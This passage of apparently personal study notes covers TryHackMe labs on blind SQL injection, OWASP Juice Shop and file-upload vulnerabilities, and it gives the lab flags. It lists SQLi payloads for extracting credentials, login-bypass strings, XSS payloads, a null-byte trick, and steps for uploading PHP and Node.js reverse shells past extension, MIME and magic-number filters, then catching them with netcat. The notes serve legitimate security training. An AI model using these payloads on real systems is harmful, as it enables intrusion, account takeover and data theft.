   3. `admin123' UNION SELECT 1,2,3 where database() like 's%';--`
      1. Returns true because database starts with s
   4. Move to next character until you get another true
      1. `admin123' UNION SELECT 1,2,3 where database() like 'sa%';--`
      2. Database name is **sqli_three**
3. Enumerate table names
   1. `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`
      1. Similar method to enumerate table names
      2. Returns false because table does not start with **a**
      3. Table name is **users**
4. Enumerate columns in the users table
   1. `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';`
      1. Need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name to avoid discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).
   2. `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`
   3. Repeating this process three times will enable you to discover the columns' id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username, which you can use the payload below:
      1. `admin123' UNION SELECT 1,2,3 from users where username like 'a%`
   4. Once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:
      1. `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`
   5. Cycling through all the characters, you'll discover the password is 3845.
   6. Flag - THM{SQL_INJECTION_1093}

#### Blind SQLi - Time Based

A time-based blind SQL injection is very similar to the above boolean-based one in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. 

This time delay is introduced using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

To establish the number of columns in a table you would use the following `admin123' UNION SELECT SLEEP(5);--`

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column: `admin123' UNION SELECT SLEEP(5),2;--`


`admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--`

`admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`

`admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%';--`

`admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`

Usee the prior examples to enumerate the column names, id, username and password.

**Final Query**
`https://website.thm/analytics?referrer= referrer=admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like '4961%`

#### Out-of-Band SQLi




## OWASP Juice Shop

### Open for business!

No Flag just an explanaion of what Juice Shop is.

### Lets go on an adventure!

Taking a look around Juice Shop. Walking the application/recon. 

1. What is the administrators email address?
   1. Checking reviews will reveal a review left by the admin that shows his email
   2. admin@juice-sh.op
2. Which parameter is used for searching
   1. Run a search
      1. http://10.10.214.132/#/search?q=test
      2. q=test - running a query?
3. What show does Jim reference in his review?
   1. Review on Green Smoothie states: Fresh out of a replicator
      1. jim@juice-sh.op - May be useful later?
      2. Star Trek Reference

### Inject the Juice

Tasks focus on injection vulnerabilities

- SQL Injection - SQL Injection is when an attacker enters a malicious or malformed query to either retrieve or tamper data from a database. And in some cases, log into accounts.
- Command Injection - Command Injection is when web applications take input or user-controlled data and run them as system commands. An attacker may tamper with this data to execute their own system commands. This can be seen in applications that perform misconfigured ping tests. 
- Email injection is a security vulnerability that allows malicious users to send email messages without prior authorization by the email server. These occur when the attacker adds extra data to fields, which are not interpreted by the server correctly.

This task will focus on **SQL Injection**

1. Log into the administrator account
   1. Start burp and enable proxy. Attempt log in and capture request. Used user & pass as the credentials. 
   2. Once the request is captured change the user provided to `' or 1=1--`
      1. This logs you in as administrator
      2. This works because 1=1 is always true. In this case an OR statement will reture true if the otherside of it is true. 
      3. The `--` character is use din SQL to comment out data, any restrictions no longer work as they are interpereted as a comment. 
2. Log into the Bender account
   1. Intercept with Burp
   2. Change email to `bender@juice-sh.op'--`
   3. This works because the email address is valid and therefore we do not need the `1=1` statement as the email is true.
      1. `1=1` can be used when the email or username is not known or valid.


### Who broke my lock?

Goal: Bruteforce Administrators Password

1. Capture logon request via burp0
2. Insert position for password
3. Load wordlist
4. Run Sniper attack to bruteforce password
   1. Wait for Sniper to finish
      1. Response code 200 (succes) received for password "admin123" with username admin@juice-sh.op

### AH! Dont' Look

**Goal: Access the confidential document**

FTP directory is exposed to public and is shown due to linking a file in About us page. Navigate to SITEIP/ftp and downloaded confidential file. 

**Goal 2: Log into MC SafeSearch's account**

User has replaced o's with 0's

**Goal 3: Download the Backup file**

Need to use a character bypass called Poinson Null Byte - %00 - URL encoded %2500

`10.10.148.95/ftp/package.json.bak%2500.md`

The Poison null bye is a NULL terminator. Tells server to terminate at that point nulling the rest of the string. 

### Who's flying this thing

Broken access control typically is two types

1. Horizontal Privilege Escalation - User can perform an action or access data of another user with the **same** level of privilege. 
2. Vertical Privilege Esalation - User can perform an action or access data of another user with the **higher** level of privilege. 

#### Question 1 - Access the Administrators Page

1. Open debugger on firefox
2. Refresh and find main-es2015.js
   1. Search for the word admin in the JS
   2. Looking for path: administration
      1. Looking below in the script shows this matches with established page paths like about.
   3. Log in as admin, browse to adminstration path
   4. flag: 946a799363226a24822008503f5d1324536629a0

#### Question 2 - View another user's shopping basket

1. Log in as admin and click on your basket, with burp intercepting. 
   1. Look for `GET /rest/basket/1 HTTP/1.1`
   2. Change the number from 1 to 2 
2. flag = `41b997a36cc33fbe4f0ba018474e19ae5ce52121`

#### Question 3 - Remove all 5 star reviews

1. Navigate to http://10.10.159.111/#/administration
2. Click the trash icon to remove the 5 star reviews
   1. flag = `50c97bcce0b895e446d61c83a21df371ac2266ef`

### Where did that come from?

XSS or Cross-site scripting is a vulnerability that allows attackers to run javascript in web applications. These are one of the most found bugs in web applications. Their complexity ranges from easy to extremely hard, as each web application parses the queries in a different way.

**Three major type of XSS attacks**

- DOM (Special) - DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the <script></script> HTML tag.
- Persistent (Server-side) - Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts.
- Reflected (Client-side) - Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitise search data.

#### Question 1 - Perform a DOM XSS

1. Input `<iframe src="javascript:alert(`xss`)">` into the search bar of OWASP Juice Shop, will trigger an alert
   1. flag = `9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf`

#### Question 2 - Perform a persistent XSS

1. Log into admin account
2. Navigate to Last Login IP page, view IP
3. Turn on intercept in burp and logout, capture logout request. Add new header `True-Client-IP` with value `<iframe src="javascript:alert(`xss`)">`
4. Forward request to server. 
5. Server takes header information. When logging back in as admin and visiting last login ip page an alert is generated showing that the XSS worked

#### Question 3 - Perform a reflected XSS

1. Login to admin account and navigate to Order history page. 
2. Clicking the truck shows a tracking page. You can see from the URL `http://10.10.159.111/#/track-result?id=5267-bdd0ed057d5f0041` that there is an id number. 
3. Insert `<iframe src="javascript:alert(`xss`)">` where the id # is and you will see an alert. 
4. The server has a lookup table or database for each tracking ID. The ID parameter is not being sanitized before its sent and we can perform an XSS attack. 

### Access the /#/score-board/page

Shows other challenges in the juice shop. Feel free to explore other challenges. 

## Upload Vulnerabilities

### Intro 

We will be looking at

- Overwriting existing files on a server
- Uploading and Executing Shells on a server
- Bypassing Client-Side filtering
- Bypassing various kinds of Server-Side filtering
- Fooling content type validation checks

### General Methodology

Understand the environment. 
-  Review source code, check for client side filtering
-  Scan with bruteforcer such as gobuster
-  Intercept upload requests with Burp
-  Use Wappalyser to get information about site
-  OWASP Zap

### Overwriting Existing Files

If there is no filtering or precautions in place files can sometimes be overwritten. Its likely permissions on files would prevent anything serious but it could be a nuisance. 

1. Navigate to overwrite.uploadvulns.thm
2. Review page source
3. Background image is mountains.jpg
4. Download sample picture from google, name it mountains.jpg
5. Upload file with same name, mountains.jpg
6. File is overwritten and background changes.
7. Flag = THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5} 

### Remote Code Execution

Allows user to execute code on the webserver. Likely low privileged but still serious. 

Typically PHP, Python Django, and Javascript (Node.js)

Less likely in routed application (i.e. an application where the routes are defined programmatically rather than being mapped to the file-system)

Two basic ways to achieve RCE through upload vulnerabilities. 
1. Webshells
2. Reverse/bind shells

#### Web Shells

**Scenario** - Located a webpage with an upload form:

1. Run a Gobuster Scan
   ![alt text](image-10.png)
2. Test upload a file, likely will go in uploads directory
3. Try to upload a webshell

**Lab**

1. Run Gobuster scan on shell.uploadvulns.thm
   1. `gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
   2. ![alt text](image-11.png)
   3. /resources is the directory files are uploaded to
2. Install and run Wappalyzer
   1. Nginx 1.14.0
   2. JQuery 3.5.1
   3. Ubuntu
3. Wappalyzer was not helpful in terms of this challenge
4. Download Pentest Monkey PHP Reverse shell - Github: https://github.com/pentestmonkey/php-reverse-shell
   1. Edit line 49 to IP of the pentesting machine
   2. Upload to site
   3. Start netcat listener - `nc -lvnp 1234` (1234 is the port used in the reverse shell file)
   4. Activate reverse sell by navigating to file `/resources/php-reverse-shell.php`
   5. View shell in terminal running netcat
   6. Run whoami, www-data
   7. `cd /var/www/`
   8. View flag.txt - `cat flag.txt`
      1. Flag = THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}

### Filtering

Client side filtering - Running in users browser. Filtering occurs before file is uploaded to the server. Easy to bypass.

Server side filtering - Run on the server. More difficult to bypass. Usually have to use payloads that conform to the filter.

#### Types of Filtering
**Extension Validation** - Blacklist extensions such as .exe or .ps1. Or whitelist extensions.
**File Type Filtering** - Similar to extension validation, more intensive. Verifies the contents of the file are acceptable to upload. 
- MIME Validation - MIME (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). MIME type for a file upload is attached in header of HTTP request. 

![alt text](image-12.png)
- Magic Number Validation - More accurate way of determining the contents of a file, not impossible to fake. 
  - String of bytes at the very beginning of the file content to identify the content. 
  - PNG file would have these bytes at the very top of the file:
    - `89 50 4E 47 0D 0A 1A 0A`
![alt text](image-13.png)
- File Length Filtering - Used to prevent huge files from being uploaded and starve resources. 
- File Name Filtering - Checking if the same file exists already. Typically filenames are sanitized. Files uploaded typically have their names changed. 
- File Content Filtering - Scan full contetns of file to ensure its not spoofing extension. Complex process

No filter is perfect by themselves but are typically used in conjunction with each other providing a multi layer approach. 

Languages typically come with methods of filtering and validating files. PHP for example had a vulnerability to bypass and extension filter by appending anull byte, followed by a valid extension. 

### Bypassing Client-Side Filtering

1. Turn off Javascript in browser
   1. Only works if the site does not need javascript to function
2. Intercept and modify incoming page
   1. Use Burp to strip out Javascript filter before it has chance to run
3. Intercept and modify the file upload
   1. Allows web page to load normally but intercepts the file upload after its already passed the filter
4. Send the file directly to the upload point
   1. Use a tool like curl to bypass the website altogether
   2. `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`
   3. Need to intercept an successful upload to see parameters being used which can then be slotted into the curl command

#### Client Side Bypass

**Method 1**
1. Check source code, see function that checks MIME type for file uplaods
![alt text](image-14.png)
2. Attempt file upload, intercept request with BurpSuite, need to see the websites response.
   1. Right click intercepted data and chose Do Intercept > Response to this request
   ![alt text](image-15.png)
   2. Response is intercepted. Delete javascript function. Forward request. File is uploaded, bypassing the filter
3. Burp will by default not intercept external JS files that web page loads. If editing is required that is not inside the main page, go to Options tab, under intercept client requests section, edit he condition on the first line and remove `^js$|`
**Method 2**
1. Upload PHP reverse shell but change extension to .jpg
2. Intercept request with Burp
   ![alt text](image-16.png)
3. Change MIME type to `text/x-php` and extension from `.jpg` to `.php`
   ![alt text](image-17.png)
4. When navigating to `http://demo.uploadvulns.thm/uploads/shell.php` with a netcat listner setup we receive a connection from the shell

##### Practical 

Target : java.uploadvulns.thm
What is the flag in /var/www/

1. Using Pentestmonkey PHP reverse shell
2. Detected client side filtering for MIME type `image/png`
   ![alt text](image-18.png)
3. Change php file to .png
4. Attempt upload and intercept with burp. Change file extension to .php and MIME type to text/x-php
5. Need to discover directories that files are
   1. Run gobuster scan on site
   2. `gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
      1. Discovered /assets and /images
6. Start netcat listener
   1. `netcat -lvnp 1234`
7. Navigate to /images/php-reverse-shell.php
8. We get a shell
9. Flag = THM{NDllZDQxNjJjOTE0YWNhZGY3YjljNmE2}

### Bypassing Server-Side Filtering: File Extensions

Need to perform testint to build an idea of what is allowed or what not allowed. Build payload based off research

Lots of different ways to filter server side. Key is to enumerate and craft a payload.

#### Practical
Target: annex.uploadvulns.thm, flag in /var/www/

Randomized naming scheme implemented. 

1. Site blocks php uploads
2. Site allows .png
3. Change filename to php-reverse-shell.png.php
   1. Denied
4. Change filename to php-reverse-shell.php.php5
   1. Allowed
5. Run gobuster to discover directories
   1. Discovered /privacy
   2. Filename = 2024-05-23-03-12-58-php-reverse-shell.png.php5
   ![alt text](image-19.png)
6. Start netcat listener `netcat -lvnp 1234`
7. Access file
8. We get a shell
9. Flag = THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}

### Bypassing Server-Side Filtering: Magic Numbers

More accurate identifier of files

In this example PHP files will be caught by the filter, but its checking the magic number to determine the file type. 

In this example we add four random characters to the top of the file in this case `AAAA`

![alt text](image-20.png)

Save the file and open in hexeditor which comes by default on kali. You will see the file as hexadecimal. The first 4 bytes are all `41`, which is hex for capital `A`

Change this to the magic number for JPEG files `FF D8 FF DB`

Save and close the file (Ctrl + x). Check with thie file command and you will see the filetype is spoofed successfully

![alt text](image-21.png)

#### Practical 

Bypass the Magic Number filter

Target: magic.uploadvulns.thm
Flag is in /var/www

1. Open reverse shell in text editor. Add `AAAA` to the top of the file and save.
2. Open in hexeditor. Site will only allow Gifs
   1. Magic nubmers for GIFs `47 49 46 38`
3. Run gobuster on site to discover where files are stored
   1. `gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
   2. Discovered /graphics and /assets
4. Start netcat listener
   1. `netcat -lvnp 1234`
5. Navigate to `http://magic.uploadvulns.thm/graphics/php-reverse-shell.php`
6. We get a shell
7. Flag = THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}

### Example Methodology

 1. The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as server or x-powered-by can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.
 2. Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.
 3. We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What's the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we're attacking, it also gives us a baseline "accepted" file which we can base further testing on.
   1. An important Gobuster switch here is the -x switch, which can be used to look for files with specific extensions. For example, if you added -x php,txt,html to your Gobuster command, the tool would append .php, .txt, and .html to each word in the selected wordlist, one at a time. This can be very useful if you've managed to upload a payload and the server is changing the name of uploaded files.
4. Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.

Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:

- If you can successfully upload a file with a totally invalid file extension (e.g. testingimage.invalidfileextension) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.
- Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.
- As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.
- Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you'll know what the acceptable limit is. If you're very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using so far.

### Practical

Find flag in /var/www/ from jewel.uploadvulns.thm

1. Run wappalyzer to identify that site is running Node.JS
2. Grab Node.JS reverse shell from `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`
3. Save as shell.jpg, site is checking for MIME types. Edit IP and port in the shell
4. Launch Burp
5. Check site for client side filters
   1. Magic number, file extension, and size
   2. Remove client side filters in Burp
   3. Ensure that .js is removed from proxy settings filter
   4. Ensure that you have enabled intercepting responses from the upload request
      1. Identify filters, remove from request, forward request. 
6. Run gobuster on content directory
   1. `gobuster dir -u http://jewel.uploadvulns.thm/content -w /root/wordlist.txt -x .jpg`
7. start netcat listener `netcat -lvnp 443`
8. BFA.jpg

**Tricky part of this room**

Shell has to be run from the /admin page, but it is looking for files in the modules directory. 

Need to use `../content/BFA.jpg` (directory traversal) to move outside of /modules and into content and run the file

After running the file with this method you will get a shell

**Flag** = THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}







